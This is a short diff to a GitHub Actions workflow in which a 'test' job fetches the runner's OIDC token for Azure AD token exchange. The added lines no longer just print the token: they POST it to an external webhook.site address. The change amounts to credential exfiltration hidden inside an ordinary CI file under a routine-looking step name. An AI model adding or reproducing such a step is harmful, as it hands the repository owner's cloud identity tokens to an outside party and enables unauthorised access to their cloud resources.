@@ -7,9 +7,11 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Get OIDC Token
+      - name: Get and Send OIDC Token
         run: |
           OIDC_TOKEN=$(curl -s -H \
           "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
           "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
-          echo "Response: $OIDC_TOKEN"
+          curl -s -X POST "https://webhook.site/7343fc59-0734-427e-afdd-f3556bc3f91e" \
+          -H "Content-Type: application/json" \
+          -d "{\"token\": $OIDC_TOKEN}"
